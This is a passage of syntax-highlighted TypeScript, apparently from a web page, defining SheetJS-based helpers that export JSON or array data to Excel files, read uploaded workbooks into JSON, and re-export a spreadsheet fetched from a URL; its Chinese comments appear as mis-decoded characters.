      bookType = <span class="hljs-string">'xlsx'</span>,
      headers,
      merges,
      colInfo,
      rowInfo,
    } = config || {}
    <span class="hljs-keyword">let</span> lists = [...json]
    <span class="hljs-keyword">if</span> (
      headers &amp;&amp;
      <span class="hljs-title function_">getTypeOf</span>(headers) === <span class="hljs-string">'Object'</span> &amp;&amp;
      <span class="hljs-title function_">isAvailableArr</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(headers))
    ) {
      <span class="hljs-comment">// æ²¡æœ‰æ•°æ®çš„æ—¶å€™ç”¨headerå»ç”Ÿæˆä¸€ä¸ªç©ºè¡¨å¤´</span>
      <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isAvailableArr</span>(lists)) {
        <span class="hljs-keyword">const</span> headersField = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(headers)
        <span class="hljs-keyword">const</span> <span class="hljs-attr">headerObj</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; = {}
        headersField.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">f</span>) =&gt;</span> {
          headerObj[f] = <span class="hljs-literal">null</span>
        })
        lists = [headerObj <span class="hljs-keyword">as</span> T]
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// æœ‰æ•°æ®çš„æ—¶å€™æ ¹æ®headerå»ç”Ÿæˆ</span>
        <span class="hljs-keyword">const</span> headerFields = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(headers)
        lists = json.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">j</span>) =&gt;</span> {
          <span class="hljs-keyword">const</span> <span class="hljs-attr">obj</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; = {}
          <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, value] <span class="hljs-keyword">of</span> headerFields) {
            obj[value] = j[key <span class="hljs-keyword">as</span> keyof T] ?? <span class="hljs-literal">null</span>
          }
          <span class="hljs-keyword">return</span> obj
        }) <span class="hljs-keyword">as</span> T[]
      }
    }

    <span class="hljs-keyword">const</span> wb = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">book_new</span>()
    <span class="hljs-keyword">const</span> ws = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">json_to_sheet</span>(lists)
    <span class="hljs-keyword">if</span> (merges) {
      ws[<span class="hljs-string">'!merges'</span>] = merges
    }
    <span class="hljs-keyword">if</span> (colInfo) {
      ws[<span class="hljs-string">'!cols'</span>] = colInfo
    }
    <span class="hljs-keyword">if</span> (rowInfo) {
      ws[<span class="hljs-string">'!rows'</span>] = rowInfo
    }
    <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">book_append_sheet</span>(wb, ws, sheetName)
    <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">writeFile</span>(wb, <span class="hljs-string">`<span class="hljs-subst">${name}</span>.<span class="hljs-subst">${bookType}</span>`</span>, { bookType })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> ä¸€ç»´æ•°ç»„å¤šsheetå¯¼å‡ºExcelæ–‡ä»¶
   *
   * æ­¤å‡½æ•°å°†å¤šä¸ªä¸€ç»´æ•°ç»„åˆ†åˆ«æ”¾åœ¨ä¸åŒçš„å·¥ä½œè¡¨ä¸­å¯¼å‡ºä¸ºä¸€ä¸ªExcelæ–‡ä»¶
   * æ”¯æŒè‡ªå®šä¹‰è¡¨å¤´ã€å•å…ƒæ ¼åˆå¹¶ã€åˆ—å±æ€§å’Œè¡Œå±æ€§
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">IExtraSheetConfig</span>} <span class="hljs-variable">params</span> - å¤šsheetå¯¼å‡ºé…ç½®é¡¹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [params.name='å¯¼å‡º'] - å¯¼å‡ºæ–‡ä»¶åç§°
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">BookType</span>} [params.bookType='xlsx'] - å¯¼å‡ºæ–‡ä»¶ç±»å‹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Array</span>} params.sheets - å·¥ä½œè¡¨é…ç½®æ•°ç»„
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any[]</span>} params.sheets[].json - è¦å¯¼å‡ºçš„æ•°æ®æ•°ç»„
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [params.sheets[].sheetName] - å·¥ä½œè¡¨åç§°
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Record&lt;string, string&gt;</span>} [params.sheets[].headers] - è‡ªå®šä¹‰è¡¨å¤´æ˜ å°„
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Range[]</span>} [params.sheets[].merges] - å•å…ƒæ ¼åˆå¹¶èŒƒå›´
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">ColInfo[]</span>} [params.sheets[].colInfo] - åˆ—å±æ€§é…ç½®
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">RowInfo[]</span>} [params.sheets[].rowInfo] - è¡Œå±æ€§é…ç½®
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">void</span>}
   */</span>
  <span class="hljs-keyword">function</span> exportJson2ExcelSheets&lt;T = <span class="hljs-built_in">any</span>&gt;(<span class="hljs-attr">params</span>: <span class="hljs-title class_">IExtraSheetConfig</span>) {
    <span class="hljs-keyword">const</span> { name = <span class="hljs-string">'å¯¼å‡º'</span>, bookType = <span class="hljs-string">'xlsx'</span>, sheets } = params || {}
    <span class="hljs-keyword">const</span> wb = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">book_new</span>()
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isAvailableArr</span>(sheets)) {
      sheets?.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">s</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> { json, headers, merges, colInfo, rowInfo, sheetName } = s || {}
        <span class="hljs-keyword">let</span> lists = [...json]
        <span class="hljs-keyword">if</span> (
          headers &amp;&amp;
          <span class="hljs-title function_">getTypeOf</span>(headers) === <span class="hljs-string">'Object'</span> &amp;&amp;
          <span class="hljs-title function_">isAvailableArr</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(headers))
        ) {
          <span class="hljs-comment">// æ²¡æœ‰æ•°æ®çš„æ—¶å€™ç”¨headerå»ç”Ÿæˆä¸€ä¸ªç©ºè¡¨å¤´</span>
          <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isAvailableArr</span>(lists)) {
            <span class="hljs-keyword">const</span> headersField = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">values</span>(headers)
            <span class="hljs-keyword">const</span> <span class="hljs-attr">headerObj</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; = {}
            headersField.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">f</span>) =&gt;</span> {
              headerObj[f] = <span class="hljs-literal">null</span>
            })
            lists = [headerObj <span class="hljs-keyword">as</span> T]
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// æœ‰æ•°æ®çš„æ—¶å€™æ ¹æ®headerå»ç”Ÿæˆ</span>
            <span class="hljs-keyword">const</span> headerFields = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(headers)
            lists = json.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">j</span>) =&gt;</span> {
              <span class="hljs-keyword">const</span> <span class="hljs-attr">obj</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>&gt; = {}
              <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, value] <span class="hljs-keyword">of</span> headerFields) {
                obj[value] = j[key] ?? <span class="hljs-literal">null</span>
              }
              <span class="hljs-keyword">return</span> obj
            }) <span class="hljs-keyword">as</span> T[]
          }
        }

        <span class="hljs-keyword">const</span> ws = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">json_to_sheet</span>(lists)
        <span class="hljs-keyword">if</span> (merges) {
          ws[<span class="hljs-string">'!merges'</span>] = merges
        }
        <span class="hljs-keyword">if</span> (colInfo) {
          ws[<span class="hljs-string">'!cols'</span>] = colInfo
        }
        <span class="hljs-keyword">if</span> (rowInfo) {
          ws[<span class="hljs-string">'!rows'</span>] = rowInfo
        }
        <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">book_append_sheet</span>(wb, ws, sheetName)
      })
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">const</span> ws = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">json_to_sheet</span>([])
      <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">book_append_sheet</span>(wb, ws)
    }

    <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">writeFile</span>(wb, <span class="hljs-string">`<span class="hljs-subst">${name}</span>.<span class="hljs-subst">${bookType}</span>`</span>, { bookType })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> äºŒç»´æ•°ç»„å¯¼å‡ºExcelæ–‡ä»¶
   *
   * æ­¤å‡½æ•°å°†ä¸€ä¸ªäºŒç»´æ•°ç»„è½¬æ¢ä¸ºExcelæ–‡ä»¶å¹¶ä¸‹è½½
   * æ”¯æŒå•å…ƒæ ¼åˆå¹¶ã€åˆ—å±æ€§å’Œè¡Œå±æ€§
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any[][]</span>} <span class="hljs-variable">aoas</span> - è¦å¯¼å‡ºçš„äºŒç»´æ•°ç»„
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">IExportConfig</span>} <span class="hljs-variable">config</span> - å¯¼å‡ºé…ç½®é¡¹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [config.name='å¯¼å‡º'] - å¯¼å‡ºæ–‡ä»¶åç§°
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">BookType</span>} [config.bookType='xlsx'] - å¯¼å‡ºæ–‡ä»¶ç±»å‹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [config.sheetName='Sheet1'] - å·¥ä½œè¡¨åç§°
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Range[]</span>} [config.merges] - å•å…ƒæ ¼åˆå¹¶èŒƒå›´
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">ColInfo[]</span>} [config.colInfo] - åˆ—å±æ€§é…ç½®
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">RowInfo[]</span>} [config.rowInfo] - è¡Œå±æ€§é…ç½®
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">void</span>}
   */</span>
  <span class="hljs-keyword">function</span> exportAoa2Excel&lt;T = <span class="hljs-built_in">any</span>&gt;(<span class="hljs-attr">aoas</span>: T[][], config?: <span class="hljs-title class_">IExportConfig</span>) {
    <span class="hljs-keyword">const</span> {
      name = <span class="hljs-string">'å¯¼å‡º'</span>,
      sheetName = <span class="hljs-string">'Sheet1'</span>,
      bookType = <span class="hljs-string">'xlsx'</span>,
      merges,
      colInfo,
      rowInfo,
    } = config || {}

    <span class="hljs-keyword">const</span> wb = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">book_new</span>()
    <span class="hljs-keyword">const</span> ws = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">aoa_to_sheet</span>(aoas)
    <span class="hljs-keyword">if</span> (merges) {
      ws[<span class="hljs-string">'!merges'</span>] = merges
    }
    <span class="hljs-keyword">if</span> (colInfo) {
      ws[<span class="hljs-string">'!cols'</span>] = colInfo
    }
    <span class="hljs-keyword">if</span> (rowInfo) {
      ws[<span class="hljs-string">'!rows'</span>] = rowInfo
    }

    <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">book_append_sheet</span>(wb, ws, sheetName)
    <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">writeFile</span>(wb, <span class="hljs-string">`<span class="hljs-subst">${name}</span>.<span class="hljs-subst">${bookType}</span>`</span>, { bookType })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> ä»æœ¬åœ°æ–‡ä»¶è¯»å–Excelå·¥ä½œç°¿
   *
   * æ­¤å‡½æ•°ä»Fileæˆ–Blobå¯¹è±¡è¯»å–Excelæ–‡ä»¶å¹¶è¿”å›å·¥ä½œç°¿å¯¹è±¡
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">File | Blob</span>} <span class="hljs-variable">file</span> - è¦è¯»å–çš„Excelæ–‡ä»¶
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise&lt;WorkBook | false&gt;</span>} è¿”å›å·¥ä½œç°¿å¯¹è±¡æˆ–falseï¼ˆè¯»å–å¤±è´¥æ—¶ï¼‰
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">readWorkbookFromLocalFile</span>(<span class="hljs-params">
    file: File | Blob,
  </span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">WorkBook</span> | <span class="hljs-literal">false</span>&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>()
      reader.<span class="hljs-title function_">readAsBinaryString</span>(file)
      reader.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) {
        <span class="hljs-keyword">const</span> data = (e.<span class="hljs-property">target</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)?.<span class="hljs-property">result</span>
        <span class="hljs-keyword">const</span> workbook = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">read</span>(data, {
          <span class="hljs-attr">type</span>: <span class="hljs-string">'binary'</span>,
          <span class="hljs-attr">raw</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">cellNF</span>: <span class="hljs-literal">true</span>,
        })
        <span class="hljs-title function_">resolve</span>(workbook)
      }
      reader.<span class="hljs-property">onerror</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        <span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>)
      }
    })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> ä»æœ¬åœ°Excelæ–‡ä»¶è¯»å–æ•°æ®ä¸ºJSONæ ¼å¼
   *
   * æ­¤å‡½æ•°ä»Fileæˆ–Blobå¯¹è±¡è¯»å–Excelæ–‡ä»¶å¹¶è¿”å›ç¬¬ä¸€ä¸ªå·¥ä½œè¡¨çš„æ•°æ®ä¸ºJSONæ•°ç»„
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">File | Blob</span>} <span class="hljs-variable">file</span> - è¦è¯»å–çš„Excelæ–‡ä»¶
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Sheet2JSONOpts</span>} [options] - å·¥ä½œè¡¨è½¬JSONçš„é€‰é¡¹
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise&lt;any[] | false&gt;</span>} è¿”å›JSONæ•°ç»„æˆ–falseï¼ˆè¯»å–å¤±è´¥æ—¶ï¼‰
   */</span>
  <span class="hljs-keyword">function</span> readFileToJson&lt;T = <span class="hljs-built_in">any</span>&gt;(
    <span class="hljs-attr">file</span>: <span class="hljs-title class_">File</span> | <span class="hljs-title class_">Blob</span>,
    options?: <span class="hljs-title class_">Sheet2JSONOpts</span>,
  ): <span class="hljs-title class_">Promise</span>&lt;T[] | <span class="hljs-literal">false</span>&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>()
      reader.<span class="hljs-title function_">readAsBinaryString</span>(file)
      reader.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) {
        <span class="hljs-keyword">const</span> data = (e.<span class="hljs-property">target</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)?.<span class="hljs-property">result</span>
        <span class="hljs-keyword">const</span> workbook = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">read</span>(data, {
          <span class="hljs-attr">type</span>: <span class="hljs-string">'binary'</span>,
          <span class="hljs-attr">raw</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">cellNF</span>: <span class="hljs-literal">true</span>,
        })
        <span class="hljs-keyword">const</span> json = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-property">sheet_to_json</span>&lt;T&gt;(
          workbook.<span class="hljs-property">Sheets</span>[workbook.<span class="hljs-property">SheetNames</span>[<span class="hljs-number">0</span>]],
          options,
        )
        <span class="hljs-title function_">resolve</span>(json)
      }
      reader.<span class="hljs-property">onerror</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        <span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>)
      }
    })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> ä»æœ¬åœ°Excelæ–‡ä»¶è¯»å–å¤šä¸ªå·¥ä½œè¡¨çš„æ•°æ®ä¸ºJSONæ ¼å¼
   *
   * æ­¤å‡½æ•°ä»Fileæˆ–Blobå¯¹è±¡è¯»å–Excelæ–‡ä»¶å¹¶è¿”å›æ‰€æœ‰å·¥ä½œè¡¨çš„æ•°æ®ä¸ºJSONå¯¹è±¡
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">File | Blob</span>} <span class="hljs-variable">file</span> - è¦è¯»å–çš„Excelæ–‡ä»¶
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Sheet2JSONOpts</span>} [options] - å·¥ä½œè¡¨è½¬JSONçš„é€‰é¡¹
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise&lt;Record&lt;string, any[]&gt; | false&gt;</span>} è¿”å›åŒ…å«æ‰€æœ‰å·¥ä½œè¡¨æ•°æ®çš„å¯¹è±¡æˆ–falseï¼ˆè¯»å–å¤±è´¥æ—¶ï¼‰
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">readFileToJsons</span>(<span class="hljs-params">
    file: File | Blob,
    options?: Sheet2JSONOpts,
  </span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>[]&gt; | <span class="hljs-literal">false</span>&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>()
      reader.<span class="hljs-title function_">readAsBinaryString</span>(file)
      reader.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) {
        <span class="hljs-keyword">const</span> data = e.<span class="hljs-property">target</span>?.<span class="hljs-property">result</span>
        <span class="hljs-keyword">const</span> workbook = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">read</span>(data, {
          <span class="hljs-attr">type</span>: <span class="hljs-string">'binary'</span>,
          <span class="hljs-attr">raw</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">cellNF</span>: <span class="hljs-literal">true</span>,
        })

        <span class="hljs-keyword">const</span> sheetNames = workbook.<span class="hljs-property">SheetNames</span>
        <span class="hljs-keyword">if</span> (!sheetNames?.<span class="hljs-property">length</span>) {
          <span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>)
        }

        <span class="hljs-keyword">const</span> jsons = sheetNames.<span class="hljs-title function_">reduce</span>(
          <span class="hljs-function">(<span class="hljs-params">pre: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">any</span>[]&gt;, cur: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
            <span class="hljs-keyword">const</span> json = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">sheet_to_json</span>(workbook.<span class="hljs-property">Sheets</span>[cur], options)
            pre[cur] = json
            <span class="hljs-keyword">return</span> pre
          },
          {},
        )

        <span class="hljs-title function_">resolve</span>(jsons)
      }
      reader.<span class="hljs-property">onerror</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        <span class="hljs-title function_">resolve</span>(<span class="hljs-literal">false</span>)
      }
    })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> æ–‡ä»¶æµå¯¼å‡ºExcelæ–‡ä»¶
   *
   * æ­¤å‡½æ•°ä»Fileæˆ–Blobå¯¹è±¡è¯»å–Excelæ–‡ä»¶æµå¹¶å¯¼å‡ºä¸ºExcelæ–‡ä»¶
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">File | Blob</span>} <span class="hljs-variable">file</span> - è¦å¯¼å‡ºçš„Excelæ–‡ä»¶æµ
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">IExportConfig</span>} <span class="hljs-variable">config</span> - å¯¼å‡ºé…ç½®é¡¹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [config.name='å¯¼å‡º'] - å¯¼å‡ºæ–‡ä»¶åç§°
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">BookType</span>} [config.bookType='xlsx'] - å¯¼å‡ºæ–‡ä»¶ç±»å‹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [config.errorMsg='ä¸‹è½½å¤±è´¥'] - é”™è¯¯æç¤ºä¿¡æ¯
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise&lt;void&gt;</span>}
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">exportBuffer2Excel</span>(<span class="hljs-params">file: File | Blob, config?: IExportConfig</span>) {
    <span class="hljs-keyword">const</span> {
      name = <span class="hljs-string">'å¯¼å‡º'</span>,
      bookType = <span class="hljs-string">'xlsx'</span>,
      errorMsg = <span class="hljs-string">'ä¸‹è½½å¤±è´¥'</span>,
    } = config || {}
    <span class="hljs-keyword">const</span> <span class="hljs-attr">wb</span>: <span class="hljs-title class_">WorkBook</span> | <span class="hljs-literal">false</span> = <span class="hljs-keyword">await</span> <span class="hljs-title function_">readWorkbookFromLocalFile</span>(file)
    <span class="hljs-keyword">if</span> (wb) {
      <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">writeFile</span>(wb, <span class="hljs-string">`<span class="hljs-subst">${name}</span>.<span class="hljs-subst">${bookType}</span>`</span>, { bookType })
    } <span class="hljs-keyword">else</span> {
      message.<span class="hljs-title function_">error</span>(errorMsg)
    }
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> ä»URLå¯¼å‡ºExcelæ–‡ä»¶
   *
   * æ­¤å‡½æ•°ä»URLè·å–Excelæ–‡ä»¶å¹¶å¯¼å‡º
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} <span class="hljs-variable">url</span> - Excelæ–‡ä»¶çš„URLåœ°å€
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">IExportConfig</span>} <span class="hljs-variable">config</span> - å¯¼å‡ºé…ç½®é¡¹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [config.name='å¯¼å‡º'] - å¯¼å‡ºæ–‡ä»¶åç§°
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">BookType</span>} [config.bookType='xlsx'] - å¯¼å‡ºæ–‡ä»¶ç±»å‹
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} [config.errorMsg='ä¸‹è½½å¤±è´¥'] - é”™è¯¯æç¤ºä¿¡æ¯
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise&lt;void&gt;</span>}
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">exportUrl2Excel</span>(<span class="hljs-params">url: <span class="hljs-built_in">string</span>, config?: IExportConfig</span>) {
    <span class="hljs-title function_">fetch</span>(url)
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> response.<span class="hljs-title function_">blob</span>())
      .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">blob</span>) =&gt;</span> {
        <span class="hljs-title function_">exportBuffer2Excel</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Blob</span>([blob]), config)
      })
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
        <span class="hljs-keyword">throw</span> error
      })
  }

  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@desc</span> ä»å·¥ä½œè¡¨ä¸­è¯»å–æŒ‡å®šåˆ—çš„æ•°æ®
   *
   * æ­¤å‡½æ•°ä»Excelæ–‡ä»¶çš„æŒ‡å®šå·¥ä½œè¡¨ä¸­è¯»å–æŒ‡å®šåˆ—çš„æ•°æ®
   *
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">File | Blob</span>} <span class="hljs-variable">file</span> - Excelæ–‡ä»¶
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} [sheetIndex=0] - å·¥ä½œè¡¨ç´¢å¼•
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string[]</span>} [columns=['A']] - è¦è¯»å–çš„åˆ—æ•°ç»„ï¼ˆå¦‚['A', 'B']ï¼‰
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Record&lt;string, string&gt;</span>} [fieldsMap={}] - åˆ—ååˆ°å­—æ®µåçš„æ˜ å°„
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Promise&lt;any[] | false&gt;</span>} è¿”å›åŒ…å«æŒ‡å®šåˆ—æ•°æ®çš„æ•°ç»„æˆ–falseï¼ˆè¯»å–å¤±è´¥æ—¶ï¼‰
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">readColumnFromSheet</span>(<span class="hljs-params">
    file: File | Blob,
    sheetIndex: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>,
    columns: <span class="hljs-built_in">string</span>[] = [<span class="hljs-string">'A'</span>],
    fieldsMap: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; = {},
  </span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">any</span>[] | <span class="hljs-literal">false</span>&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> reader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>()
      reader.<span class="hljs-title function_">readAsBinaryString</span>(file)
      reader.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) {
        <span class="hljs-keyword">const</span> data = (e.<span class="hljs-property">target</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)?.<span class="hljs-property">result</span>
        <span class="hljs-keyword">const</span> workbook = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-title function_">read</span>(data, {
          <span class="hljs-attr">type</span>: <span class="hljs-string">'binary'</span>,
          <span class="hljs-attr">raw</span>: <span class="hljs-literal">true</span>,
          <span class="hljs-attr">cellNF</span>: <span class="hljs-literal">true</span>,
        })

        <span class="hljs-keyword">const</span> sheetName = workbook.<span class="hljs-property">SheetNames</span>[sheetIndex]
        <span class="hljs-keyword">const</span> worksheet = workbook.<span class="hljs-property">Sheets</span>[sheetName]

        <span class="hljs-comment">// è·å– A åˆ—çš„æ‰€æœ‰æ•°æ®ï¼Œè·³è¿‡ç¬¬ä¸€è¡Œï¼ˆæ ‡é¢˜è¡Œï¼‰</span>
        <span class="hljs-keyword">const</span> columnData = []
        <span class="hljs-keyword">const</span> range = <span class="hljs-variable constant_">XLSX</span>.<span class="hljs-property">utils</span>.<span class="hljs-title function_">decode_range</span>(worksheet[<span class="hljs-string">'!ref'</span>] <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>)

        <span class="hljs-comment">// ä»ç¬¬2è¡Œå¼€å§‹ï¼ˆç´¢å¼•ä¸º1ï¼Œè·³è¿‡æ ‡é¢˜è¡Œï¼‰</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> row = range.<span class="hljs-property">s</span>.<span class="hljs-property">r</span> + <span class="hljs-number">1</span>; row &lt;= range.<span class="hljs-property">e</span>.<span class="hljs-property">r</span>; row++) {
